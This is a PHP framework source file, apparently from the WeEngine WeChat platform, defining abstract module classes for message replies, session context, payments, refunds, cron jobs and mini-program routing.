	public function fieldsFormSubmit($rid) {
		//
	}
	/**
	 * 可能需要实现的操作, 在删除模块规则成功后调用此方法，做一些删除清理工作。
	 * @param int $rid 规则编号
	 * @return boolean 删除成功返回true, 否则返回false
	 */
	public function ruleDeleted($rid) {
		return true;
	}
	/**
	 * 可能需要实现的操作, 如果模块需要配置参数, 请在此方法内部处理展示和保存配置项
	 * @param array $settings 已保存的配置项数据
	 * @return void
	 */
	public function settingsDisplay($settings) {
		//
	}
}

/**
 * 模块消息处理器
 */
abstract class WeModuleProcessor extends WeBase {
	/**
	 * @var int 规则优先级(0~255)
	 */
	public $priority;
	/**
	 * @var array 预定义的消息数据结构,本次请求消息,来自粉丝用户, 此属性由系统初始化, 消息格式请参阅 "开发术语 - 消息类型"
	 */
	public $message;
	/**
	 * @var boolean 本次对话是否为上下文响应对话, 如果当前对话是由上下文锁定而路由到的. 此值为 true, 否则为 false
	 */
	public $inContext;
	/**
	 * @var int 本次请求匹配到的规则编号
	 */
	public $rule;

	public function __construct(){
		global $_W;

		$_W['member'] = array();
		if(!empty($_W['openid'])){
			load()->model('mc');
			$_W['member'] = mc_fetch($_W['openid']);
		}
	}

	/**
	 * 预定义的操作, 开始上下文会话, 可附加参数设置超时时间.
	 * @param int $expire 当前上下文的超时时间, 单位秒.
	 * @return boolean 成功启动上下文返回true, 如果当前已经在上下文环境中也会返回false
	 */
	protected function beginContext($expire = 1800) {
		if($this->inContext) {
			return true;
		}
		$expire = intval($expire);
		WeSession::$expire = $expire;
		$_SESSION['__contextmodule'] = $this->module['name'];
		$_SESSION['__contextrule'] = $this->rule;
		$_SESSION['__contextexpire'] = TIMESTAMP + $expire;
		$_SESSION['__contextpriority'] = $this->priority;
		$this->inContext = true;

		return true;
	}
	/**
	 * 预定义的操作, 重置上下文过期时间
	 * @param int $expire 新的会话过期时间
	 * @return bool 成功刷新上下文返回true, 如果当前不在上下文环境中也会返回false
	 */
	protected function refreshContext($expire = 1800) {
		if(!$this->inContext) {
			return false;
		}
		$expire = intval($expire);
		WeSession::$expire = $expire;
		$_SESSION['__contextexpire'] = TIMESTAMP + $expire;

		return true;
	}
	/**
	 * 预定义的操作, 结束上下文会话. <b>注意: 这个操作会销毁$_SESSION中的数据</b>
	 * @return void
	 */
	protected function endContext() {
		unset($_SESSION['__contextmodule']);
		unset($_SESSION['__contextrule']);
		unset($_SESSION['__contextexpire']);
		unset($_SESSION['__contextpriority']);
		unset($_SESSION);
		$this->inContext = false;
		session_destroy();
	}
	/**
	 * 需要实现的操作, 应答此条请求. 如果响应内容为空. 将会调用优先级更低的模块, 直到默认回复为止
	 * @return array|string 返回值为消息数据结构, 或者消息xml定义
	 */
	abstract function respond();

	/**
	 * 预定义的操作，直接回复success
	 */
	protected function respSuccess() {
		return 'success';
	}

	/**
	 * 预定义的操作, 构造返回文本消息结构
	 * @param string $content 回复的消息内容
	 * @return array 返回统一响应消息结构
	 */
	protected function respText($content) {
		if (empty($content)) {
			return error(-1, 'Invaild value');
		}
		if(stripos($content,'./') !== false) {
			preg_match_all('/<a .*?href="(.*?)".*?>/is',$content,$urls);
			if (!empty($urls[1])) {
				foreach ($urls[1] as $url) {
					$content = str_replace($url, $this->buildSiteUrl($url), $content);
				}
			}
		}
		$content = str_replace("\r\n", "\n", $content);
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'text';
		$response['Content'] = htmlspecialchars_decode($content);
		preg_match_all('/\[U\+(\\w{4,})\]/i', $response['Content'], $matchArray);
		if(!empty($matchArray[1])) {
			foreach ($matchArray[1] as $emojiUSB) {
				$response['Content'] = str_ireplace("[U+{$emojiUSB}]", utf8_bytes(hexdec($emojiUSB)), $response['Content']);
			}
		}
		return $response;
	}
	/**
	 * 预定义的操作, 构造返回图像消息结构
	 * @param string $mid 回复的图像资源ID
	 * @return array 返回的消息数组结构
	 */
	protected function respImage($mid) {
		if (empty($mid)) {
			return error(-1, 'Invaild value');
		}
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'image';
		$response['Image']['MediaId'] = $mid;
		return $response;
	}
	/**
	 * 预定义的操作, 构造返回声音消息结构
	 * @param string $mid 回复的音频资源ID
	 * @return array 返回的消息数组结构
	 */
	protected function respVoice($mid) {
		if (empty($mid)) {
			return error(-1, 'Invaild value');
		}
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'voice';
		$response['Voice']['MediaId'] = $mid;
		return $response;
	}
	/**
	 * 预定义的操作, 构造返回视频消息结构
	 * @param array $video 回复的视频定义(包含两个元素 video - string: 视频资源ID, thumb - string: 视频缩略图资源ID)
	 * @return array 返回的消息数组结构
	 */
	protected function respVideo(array $video) {
		if (empty($video)) {
			return error(-1, 'Invaild value');
		}
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'video';
		$response['Video']['MediaId'] = $video['MediaId'];
		$response['Video']['Title'] = $video['Title'];
		$response['Video']['Description'] = $video['Description'];
		return $response;
	}
	/**
	 * 预定义的操作, 构造返回音乐消息结构
	 * @param string $music 回复的音乐定义(包含元素 title - string: 音乐标题, description - string: 音乐描述, musicurl - string: 音乐地址, hqhqmusicurl - string: 高品质音乐地址, thumb - string: 音乐封面资源ID)
	 * @return array 返回的消息数组结构
	 */
	protected function respMusic(array $music) {
		if (empty($music)) {
			return error(-1, 'Invaild value');
		}
		global $_W;
		$music = array_change_key_case($music);
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'music';
		$response['Music'] = array(
			'Title' => $music['title'],
			'Description' => $music['description'],
			'MusicUrl' => tomedia($music['musicurl'])
		);
		if (empty($music['hqmusicurl'])) {
			$response['Music']['HQMusicUrl'] = $response['Music']['MusicUrl'];
		} else {
			$response['Music']['HQMusicUrl'] = tomedia($music['hqmusicurl']);
		}
		if($music['thumb']) {
			$response['Music']['ThumbMediaId'] = $music['thumb'];
		}
		return $response;
	}
	/**
	 * 预定义的操作, 构造返回图文消息结构, 一条图文消息不能超过 10 条内容
	 * @param array $news 回复的图文定义,定义为元素集合
	 * <pre>
	 * 	array(
				'title' => '', 		// string: 新闻标题
				'picurl' => '',		// string: 新闻描述
				'url' => '',		// string: 图片链接
				'description' => ''	/string: 原文链接
			);
		</pre>
	 * @return array 返回的消息数组结构
	 */
	protected function respNews(array $news) {
		if (empty($news) || count($news) > 10) {
			return error(-1, 'Invaild value');
		}
		$news = array_change_key_case($news);
		if (!empty($news['title'])) {
			$news = array($news);
		}
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'news';
		$response['ArticleCount'] = count($news);
		$response['Articles'] = array();
		foreach ($news as $row) {
			$row = array_change_key_case($row);
			$response['Articles'][] = array(
				'Title' => $row['title'],
				'Description' => ($response['ArticleCount'] > 1) ? '' : $row['description'],
				'PicUrl' => tomedia($row['picurl']),
				'Url' => $this->buildSiteUrl($row['url']),
				'TagName' => 'item'
			);
		}
		return $response;
	}

	/**
	 * 预定义的操作, 构造返回转接多客服结构
	 * @return array 返回的消息数组结构
	 */
	protected function respCustom(array $message = array()) {
		$response = array();
		$response['FromUserName'] = $this->message['to'];
		$response['ToUserName'] = $this->message['from'];
		$response['MsgType'] = 'transfer_customer_service';
		if (!empty($message['TransInfo']['KfAccount'])) {
			$response['TransInfo']['KfAccount'] = $message['TransInfo']['KfAccount'];
		}
		return $response;
	}

	/**
	 * 对要返回到微信端的微擎微站链接中注入身份验证信息
	 *
	 * @param string $url 要返回的微擎链接
	 * @return string 返回注入了身份验证信息的链接
	 */
	protected function buildSiteUrl($url) {
		global $_W;
		$mapping = array(
			'[from]' => $this->message['from'],
			'[to]' => $this->message['to'],
			'[rule]' => $this->rule,
			'[uniacid]' => $_W['uniacid'],
		);
		$url = str_replace(array_keys($mapping), array_values($mapping), $url);
		$url = preg_replace('/(http|https):\/\/.\/index.php/', './index.php', $url);
		if(strexists($url, 'http://') || strexists($url, 'https://')) {
			return $url;
		}
		if (uni_is_multi_acid() && strexists($url, './index.php?i=') && !strexists($url, '&j=') && !empty($_W['acid'])) {
			$url = str_replace("?i={$_W['uniacid']}&", "?i={$_W['uniacid']}&j={$_W['acid']}&", $url);
		}
		if ($_W['account']['level'] == ACCOUNT_SERVICE_VERIFY) {
			return $_W['siteroot'] . 'app/' . $url;
		}
		static $auth;
		if(empty($auth)){
			$pass = array();
			$pass['openid'] = $this->message['from'];
			$pass['acid'] = $_W['acid'];

			$sql = 'SELECT `fanid`,`salt`,`uid` FROM ' . tablename('mc_mapping_fans') . ' WHERE `acid`=:acid AND `openid`=:openid';
			$pars = array();
			$pars[':acid'] = $_W['acid'];
			$pars[':openid'] = $pass['openid'];
			$fan = pdo_fetch($sql, $pars);
			if(empty($fan) || !is_array($fan) || empty($fan['salt'])) {
				$fan = array('salt' => '');
			}
			$pass['time'] = TIMESTAMP;
			$pass['hash'] = md5("{$pass['openid']}{$pass['time']}{$fan['salt']}{$_W['config']['setting']['authkey']}");
			$auth = base64_encode(json_encode($pass));
		}

		$vars = array();
		$vars['uniacid'] = $_W['uniacid'];
		$vars['__auth'] = $auth;
		$vars['forward'] = base64_encode($url);

		return $_W['siteroot'] . 'app/' . str_replace('./', '', url('auth/forward', $vars));
	}

	/**
	 * 在 processor 中扩展 $_W 供开发者使用.
	 * 使用方式: $this->extend_W();
	 */
	protected function extend_W(){
		global $_W;

		if(!empty($_W['openid'])){
			load()->model('mc');
			$_W['member'] = mc_fetch($_W['openid']);
		}
		if(empty($_W['member'])){
			$_W['member'] = array();
		}

		if(!empty($_W['acid'])){
			load()->model('account');
			if (empty($_W['uniaccount'])) {
				$_W['uniaccount'] = uni_fetch($_W['uniacid']);
			}
			if (empty($_W['account'])) {
				$_W['account'] = account_fetch($_W['acid']);
				$_W['account']['qrcode'] = tomedia('qrcode_'.$_W['acid'].'.jpg').'?time='.$_W['timestamp'];
				$_W['account']['avatar'] = tomedia('headimg_'.$_W['acid'].'.jpg').'?time='.$_W['timestamp'];
				$_W['account']['groupid'] = $_W['uniaccount']['groupid'];
			}
		}
	}
}

/**
 * 模块订阅器
 */
abstract class WeModuleReceiver extends WeBase {
	/**
	 * @var array 预定义的数据, 本次请求的参数情况.
	 * <pre>
	 * array(
	 * 		module - string: 模块名称,
	 * 		rule - int: 规则编号,
	 * 		context - bool: 是否在上下文中
	 * )
	 * </pre>
	 */
	public $params;
	/**
	 * @var array 预定义的数据, 本次请求的响应情况, 响应格式请参阅 "开发术语 - 响应类型"
	 */
	public $response;
	/**
	 * @var array 预定义的数据, 本次请求所匹配的关键字
	 */
	public $keyword;
	/**
	 * @var array 粉丝发送的数据消息
	 */
	public $message;
	/**
	 * 需要实现的操作. 处理此条请求订阅, 此方法内部的输出无效.
	 * <b>请不要调用 exit 或 die 来结束程序执行</b>.
	 * @return void
	 */
	abstract function receive();
}

/**
 * 模块微站
 */
abstract class WeModuleSite extends WeBase {
	/**
	 * @var bool 预定义的数据, 是否在移动终端
	 */
	public $inMobile;

	public function __call($name, $arguments) {
		$isWeb = stripos($name, 'doWeb') === 0;
		$isMobile = stripos($name, 'doMobile') === 0;
		if($isWeb || $isMobile) {
			$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/';
			if($isWeb) {
				$dir .= 'web/';
				$fun = strtolower(substr($name, 5));
			}
			if($isMobile) {
				$dir .= 'mobile/';
				$fun = strtolower(substr($name, 8));
			}
			$file = $dir . $fun . '.inc.php';
			if(file_exists($file)) {
				require $file;
				exit;
			} else {
				$dir = str_replace("addons", "framework/builtin", $dir);
				$file = $dir . $fun . '.inc.php';
				if(file_exists($file)) {
					require $file;
					exit;
				}
			}
		}
		trigger_error("访问的方法 {$name} 不存在.", E_USER_WARNING);
		return null;
	}
	public function __get($name) {
		if ($name == 'module') {
			if (!empty($this->module)) {
				return $this->module;
			} else {
				return getglobal('current_module');
			}
		}
	}

	/**
	 * 调用系统的支付功能, 只能在 Mobile 端调用
	 * @param array $params
	 * $params['tid'] 支付订单编号, 应保证在同一模块内部唯一
	 * $params['title'] 商家名称
	 * $params['fee'] 总费用, 只能大于 0
	 * $params['user'] 付款用户, 付款的用户名(选填项)
	 * @param array $mine 开发者自定义的信息（二维数组）
	 * 格式：array(array('name' => '自定义信息', 'value' => '自定义值'))；
	 * @return void
	 */
	protected function pay($params = array(), $mine = array()) {
		global $_W;
		load()->model('activity');
		load()->model('module');
		activity_coupon_type_init();
		if(!$this->inMobile) {
			message('支付功能只能在手机上使用', '', '');
		}
		$params['module'] = $this->module['name'];
//		如果价格为0 直接执行模块支付回调方法
		if($params['fee'] <= 0) {
			$pars = array();
			$pars['from'] = 'return';
			$pars['result'] = 'success';
			$pars['type'] = '';
			$pars['tid'] = $params['tid'];
			$site = WeUtility::createModuleSite($params['module']);
			$method = 'payResult';
			if (method_exists($site, $method)) {
				exit($site->$method($pars));
			}
		}
		$log = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $params['module'], 'tid' => $params['tid']));
		if (empty($log)) {
			$log = array(
				'uniacid' => $_W['uniacid'],
				'acid' => $_W['acid'],
				'openid' => $_W['member']['uid'],
				'module' => $this->module['name'],
				'tid' => $params['tid'],
				'fee' => $params['fee'],
				'card_fee' => $params['fee'],
				'status' => '0',
				'is_usecard' => '0',
			);
			pdo_insert('core_paylog', $log);
		}
		if($log['status'] == '1') {
			message('这个订单已经支付成功, 不需要重复支付.', '', 'info');
		}
		$setting = uni_setting($_W['uniacid'], array('payment', 'creditbehaviors'));
		if(!is_array($setting['payment'])) {
			message('没有有效的支付方式, 请联系网站管理员.', '', 'error');
		}
		$pay = $setting['payment'];
		$we7_coupon_info = module_fetch('we7_coupon');
		if (!empty($we7_coupon_info)) {
			$cards = activity_paycenter_coupon_available();
			if (!empty($cards)) {
				foreach ($cards as $key => &$val) {
					if ($val['type'] == '1') {
						$val['discount_cn'] = sprintf("%.2f", $params['fee'] * (1 - $val['extra']['discount'] * 0.01));
						$coupon[$key] = $val;
					} else {
						$val['discount_cn'] = sprintf("%.2f", $val['extra']['reduce_cost'] * 0.01);
						$token[$key] = $val;
						if ($log['fee'] < $val['extra']['least_cost'] * 0.01) {
							unset($token[$key]);
						}
					}
					unset($val['icon']);
					unset($val['description']);
				}
			}
			$cards_str = json_encode($cards);
		}
		foreach ($pay as &$value) {
			$value['switch'] = $value['pay_switch'];
		}
		unset($value);
		if (empty($_W['member']['uid'])) {
			$pay['credit']['switch'] = false;
		}
		if ($params['module'] == 'paycenter') {
			$pay['delivery']['switch'] = false;
			$pay['line']['switch'] = false;
		}
		if (!empty($pay['credit']['switch'])) {
			$credtis = mc_credit_fetch($_W['member']['uid']);
			$credit_pay_setting = mc_fetch($_W['member']['uid'], array('pay_password'));
			$credit_pay_setting = $credit_pay_setting['pay_password'];
		}
		$you = 0;
		include $this->template('common/paycenter');
	}

	/**
	 * 调用系统的退款功能
	 * @param array $params
	 * $tid 支付订单编号, 应保证在同一模块内部唯一
	 * $fee 退款金额（选填，默认全额退款）
	 * $reason 退款原因(选填项)
	 */
	protected function refund($tid, $fee = 0, $reason = '') {
		load()->model('refund');
		$refund_id = refund_create_order($tid, $this->module['name'], $fee, $reason);
		if (is_error($refund_id)) {
			return $refund_id;
		}
		return refund($refund_id);
	}

	/**
	 * 这是一个回调方法, 当系统在支付完成时调用这个方法通知模块支付结果
	 * @param array $ret
	 * $ret['uniacid'] 当前公众号编号
	 * $ret['result'] 支付结果 success - 成功, 其它值失败
	 * $ret['type'] 支付方式 alipay - 支付宝, wechat - 微信支付, credit - 余额支付
	 * $ret['from'] 通知来源 notify - 后台通知(没有页面访问, 不能进行页面跳转), return - 页面通知(有用户访问, 可以进行跳转和引导)
	 * $ret['tid'] 支付订单编号
	 * $ret['user'] 支付此订单的用户
	 * $ret['fee'] 订单支付金额
	 * $ret['tag'] 订单附加信息, 根据支付类型不同, 所包含数据不同
	 * @return void
	 */
	public function payResult($ret) {
		global $_W;
		if($ret['from'] == 'return') {
			if ($ret['type'] == 'credit2') {
				message('已经成功支付', url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
			} else {
				message('已经成功支付', '../../' . url('mobile/channel', array('name' => 'index', 'weid' => $_W['weid'])), 'success');
			}
		}
	}

	/**
	 * 查询当前模块的特定订单支付结果
	 * @param int $tid 支付订单编号
	 * @return array $ret 支付结果
	 * $ret['uniacid'] 当前公众号编号
	 * $ret['result'] 支付结果 success - 成功, 其它值失败
	 * $ret['type'] 支付方式 alipay - 支付宝, wechat - 微信支付, credit - 余额支付
	 * $ret['from'] 通知来源 notify - 后台通知(没有页面访问, 不能进行页面跳转), return - 页面通知(有用户访问, 可以进行跳转和引导)
	 * $ret['tid'] 支付订单编号
	 * $ret['user'] 支付此订单的用户
	 * $ret['fee'] 订单支付金额
	 * $ret['tag'] 订单附加信息, 根据支付类型不同, 所包含数据不同
	 */
	protected function payResultQuery($tid) {
		$sql = 'SELECT * FROM ' . tablename('core_paylog') . ' WHERE `module`=:module AND `tid`=:tid';
		$params = array();
		$params[':module'] = $this->module['name'];
		$params[':tid'] = $tid;
		$log = pdo_fetch($sql, $params);
		$ret = array();
		if(!empty($log)) {
			$ret['uniacid'] = $log['uniacid'];
			$ret['result'] = $log['status'] == '1' ? 'success' : 'failed';
			$ret['type'] = $log['type'];
			$ret['from'] = 'query';
			$ret['tid'] = $log['tid'];
			$ret['user'] = $log['openid'];
			$ret['fee'] = $log['fee'];
		}
		return $ret;
	}

	/**
	 * 统一分享操作
	 * @param array $params
	 * $params['action'] 分享的操作类型或是原因
	 * $params['module'] 模块名称
	 * $params['uid'] 当前用户
	 * $params['sign'] 积分操作标志,每个模块里面唯一
	 */
	protected function share($params = array()) {
		global $_W;
		$url = murl('utility/share', array('module' => $params['module'], 'action' => $params['action'], 'sign' => $params['sign'], 'uid' => $params['uid']));
		echo <<<EOF
		<script>
			//转发成功后事件
			window.onshared = function(){
				var url = "{$url}";
				$.post(url);
			}
		</script>
EOF;
	}

	/**
	 * 统一点击操作
	 * @param array $params
	 * $params['action'] 分享的操作类型或是原因
	 * $params['module'] 模块名称
	 * $params['tuid'] 当前用户
	 * $params['fuid'] 当前用户
	 * $params['sign'] 积分操作标志,每个模块里面唯一
	 */
	protected function click($params = array()) {
		global $_W;
		$url = murl('utility/click', array('module' => $params['module'], 'action' => $params['action'], 'sign' => $params['sign'], 'tuid' => $params['tuid'], 'fuid' => $params['fuid']));
		echo <<<EOF
		<script>
			var url = "{$url}";
			$.post(url);
		</script>
EOF;
	}

}

/**
 * 模块计划任务
 */
abstract class WeModuleCron extends WeBase {
	public function __call($name, $arguments) {
		if($this->modulename == 'task') {
			$dir = IA_ROOT . '/framework/builtin/task/cron/';
		} else {
			$dir = IA_ROOT . '/addons/' . $this->modulename . '/cron/';
		}
		$fun = strtolower(substr($name, 6));
		$file = $dir . $fun . '.inc.php';
		if(file_exists($file)) {
			require $file;
			exit;
		}
		trigger_error("访问的方法 {$name} 不存在.", E_USER_WARNING);
		return error(-1009, "访问的方法 {$name} 不存在.");
	}

	//记录触发记录
	public function addCronLog($tid, $errno, $note) {
		global $_W;
		if(!$tid) {
			iajax(-1, 'tid参数错误', '');
		}
		$data = array(
			'uniacid' => $_W['uniacid'],
			'module' => $this->modulename,
			'type' => $_W['cron']['filename'],
			'tid' => $tid,
			'note' => $note,
			'createtime' => TIMESTAMP
		);
		pdo_insert('core_cron_record', $data);
		iajax($errno, $note, '');
	}
}

/**
 * 模块小程序
 */
abstract class WeModuleWxapp extends WeBase {
	public $appid;
	public $version;


	public function __call($name, $arguments) {
		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/wxapp';
		$function_name = strtolower(substr($name, 6));
		//版本号不存在相应的目录则直接使用最新版
		$func_file = "{$function_name}.inc.php";
		$file = "$dir/{$this->version}/{$function_name}.inc.php";
		if (!file_exists($file)) {
			$version_path_tree = glob("$dir/*");
			usort($version_path_tree, function($version1, $version2) {
				return -version_compare($version1, $version2);
			});
			if (!empty($version_path_tree)) {
				// 先过滤目录
				$dirs = array_filter($version_path_tree, function($path) use ($func_file){
					$file_path = "$path/$func_file";
					return is_dir($path) && file_exists($file_path);
				});
				$dirs = array_values($dirs);

				// 再过滤文件
				$files = array_filter($version_path_tree, function($path) use ($func_file){
					return is_file($path) && pathinfo($path, PATHINFO_BASENAME) == $func_file;
				});
				$files = array_values($files);

				if (count($dirs) > 0) {
					$file = current($dirs).'/'.$func_file;
				} else if(count($files) > 0){
					$file = current($files);
				}
			}
		}
		if(file_exists($file)) {
			require $file;
			exit;
		}
		return null;
	}

	public function result($errno, $message, $data = '') {
		exit(json_encode(array(
			'errno' => $errno,
			'message' => $message,
			'data' => $data,
		)));
	}

	public function checkSign() {
		global $_GPC;
		if (!empty($_GET) && !empty($_GPC['sign'])) {
			foreach ($_GET as $key => $get_value) {
				if (!empty($get_value) && $key != 'sign') {
					$sign_list[$key] = $get_value;
				}
			}
			ksort($sign_list);
			$sign = http_build_query($sign_list, '', '&') . $this->token;
			return md5($sign) == $_GPC['sign'];
		} else {
			return false;
		}
	}

	protected function pay($order) {
		global $_W, $_GPC;
		load()->model('account');
		$paytype = !empty($order['paytype']) ? $order['paytype'] : 'wechat';
		$moduels = uni_modules();
		if (empty($order) || !array_key_exists($this->module['name'], $moduels)) {
			return error(1, '模块不存在');
		}
		$moduleid = empty($this->module['mid']) ? '000000' : sprintf("%06d", $this->module['mid']);
		$uniontid = date('YmdHis') . $moduleid . random(8, 1);
		$paylog = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $this->module['name'], 'tid' => $order['tid']));
		if (empty($paylog)) {
			$paylog = array(
				'uniacid' => $_W['uniacid'],
				'acid' => $_W['acid'],
				'type' => 'wxapp',
				'openid' => $_W['openid'],
				'module' => $this->module['name'],
				'tid' => $order['tid'],
				'uniontid' => $uniontid,
				'fee' => floatval($order['fee']),
				'card_fee' => floatval($order['fee']),
				'status' => '0',
				'is_usecard' => '0',
				'tag' => iserializer(array('acid' => $_W['acid'], 'uid' => $_W['member']['uid']))
			);
			pdo_insert('core_paylog', $paylog);
			$paylog['plid'] = pdo_insertid();
		}
		if (!empty($paylog) && $paylog['status'] != '0') {
			return error(1, '这个订单已经支付成功, 不需要重复支付.');
		}
		if (!empty($paylog) && empty($paylog['uniontid'])) {
			pdo_update('core_paylog', array(
				'uniontid' => $uniontid,
			), array('plid' => $paylog['plid']));
			$paylog['uniontid'] = $uniontid;
		}
		$_W['openid'] = $paylog['openid'];
		$params = array(
			'tid' => $paylog['tid'],
			'fee' => $paylog['card_fee'],
			'user' => $paylog['openid'],
			'uniontid' => $paylog['uniontid'],
			'title' => $order['title'],
		);
		if ($paytype == 'wechat') {
			return $this->wechatExtend($params);
		} elseif ($paytype == 'credit') {
			return $this->creditExtend($params);
		}
	}
	protected function wechatExtend($params) {
		global $_W;
		load()->model('payment');
		$wxapp_uniacid = intval($_W['account']['uniacid']);
		$setting = uni_setting($wxapp_uniacid, array('payment'));
		$wechat_payment = array(
			'appid' => $_W['account']['key'],
			'signkey' => $setting['payment']['wechat']['signkey'],
			'mchid' => $setting['payment']['wechat']['mchid'],
			'version' => 2,
		);
		return wechat_build($params, $wechat_payment);
	}

	protected function creditExtend($params) {
		global $_W;
		$credtis = mc_credit_fetch($_W['member']['uid']);
		$paylog = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $this->module['name'], 'tid' => $params['tid']));
		if (empty($_GPC['notify'])) {
			if (!empty($paylog) && $paylog['status'] != '0') {
				return error(-1, '该订单已支付');
			}
			if ($credtis['credit2'] < $params['fee']) {
				return error(-1, '余额不足');
			}
			$fee = floatval($params['fee']);
			$result = mc_credit_update($_W['member']['uid'], 'credit2', -$fee, array($_W['member']['uid'], '消费credit2:' . $fee));
			if (is_error($result)) {
				return error(-1, $result['message']);
			}
			pdo_update('core_paylog', array('status' => '1'), array('plid' => $paylog['plid']));
			$site = WeUtility::createModuleWxapp($paylog['module']);
			if (is_error($site)) {
				return error(-1, '参数错误');
			}
			$site->weid = $_W['weid'];
			$site->uniacid = $_W['uniacid'];
			$site->inMobile = true;
			$method = 'doPagePayResult';
			if (method_exists($site, $method)) {
				$ret = array();
				$ret['result'] = 'success';
				$ret['type'] = $paylog['type'];
				$ret['from'] = 'return';
				$ret['tid'] = $paylog['tid'];
				$ret['user'] = $paylog['openid'];
				$ret['fee'] = $paylog['fee'];
				$ret['weid'] = $paylog['weid'];
				$ret['uniacid'] = $paylog['uniacid'];
				$ret['acid'] = $paylog['acid'];
				$ret['is_usecard'] = $paylog['is_usecard'];
				$ret['card_type'] = $paylog['card_type'];
				$ret['card_fee'] = $paylog['card_fee'];
				$ret['card_id'] = $paylog['card_id'];
				$site->$method($ret);
			}
		} else {
			$site = WeUtility::createModuleWxapp($paylog['module']);
			if (is_error($site)) {
				return error(-1, '参数错误');
			}
			$site->weid = $_W['weid'];
			$site->uniacid = $_W['uniacid'];
			$site->inMobile = true;
			$method = 'doPagePayResult';
			if (method_exists($site, $method)) {
				$ret = array();
				$ret['result'] = 'success';
				$ret['type'] = $paylog['type'];
				$ret['from'] = 'notify';
				$ret['tid'] = $paylog['tid'];
				$ret['user'] = $paylog['openid'];
				$ret['fee'] = $paylog['fee'];
				$ret['weid'] = $paylog['weid'];
				$ret['uniacid'] = $paylog['uniacid'];
				$ret['acid'] = $paylog['acid'];
				$ret['is_usecard'] = $paylog['is_usecard'];
				$ret['card_type'] = $paylog['card_type'];
				$ret['card_fee'] = $paylog['card_fee'];
				$ret['card_id'] = $paylog['card_id'];
				$site->$method($ret);
			}
		}
	}
}

/**
 * 模块插件
 */
abstract class WeModuleHook extends WeBase {

}

abstract class WeModuleWebapp extends WeBase {
	public function __call($name, $arguments) {
		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/webapp';
		$function_name = strtolower(substr($name, 6));
		$file = "$dir/{$function_name}.inc.php";
		if(file_exists($file)) {
			require $file;
			exit;
		}
		return null;
	}
}


abstract class WeModulePhoneapp extends webase {
	public $version;

	public function __call($name, $arguments) {
		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/phoneapp';
		$function_name = strtolower(substr($name, 6));
		$func_file = "{$function_name}.inc.php";
		$file = "$dir/{$this->version}/{$function_name}.inc.php";
		if (!file_exists($file)) {
			$version_path_tree = glob("$dir/*");
			usort($version_path_tree, function($version1, $version2) {
				return -version_compare($version1, $version2);
			});
			if (!empty($version_path_tree)) {
				// 先过滤目录
				$dirs = array_filter($version_path_tree, function($path) use ($func_file){
					$file_path = "$path/$func_file";
					return is_dir($path) && file_exists($file_path);
				});
				$dirs = array_values($dirs);

				// 再过滤文件
				$files = array_filter($version_path_tree, function($path) use ($func_file){
					return is_file($path) && pathinfo($path, PATHINFO_BASENAME) == $func_file;
				});
				$files = array_values($files);

				if (count($dirs) > 0) {
					$file = $dirs[0].'/'.$func_file;
				} else if(count($files) > 0){
					$file = $files[0];
				}
			}
		}
		if (file_exists($file)) {
			require $file;
			exit;
		}
		return null;
	}

	public function result($errno, $message, $data = '') {
		exit(json_encode(array(
			'errno' => $errno,
			'message' => $message,
			'data' => $data,
		)));
	}
}

/**
 *  模块系统首页
 */
abstract class WeModuleSystemWelcome extends WeBase {
}

/**
 *  模块手机端
 */
abstract class WeModuleMobile extends WeBase {
	public function __call($name, $arguments) {
		$dir = IA_ROOT . '/addons/' . $this->modulename . '/inc/systemWelcome';
		$function_name = strtolower(substr($name, 5));
		$file = "$dir/{$function_name}.inc.php";
		if(file_exists($file)) {
			require $file;
			exit;
		}
		return null;
	}
}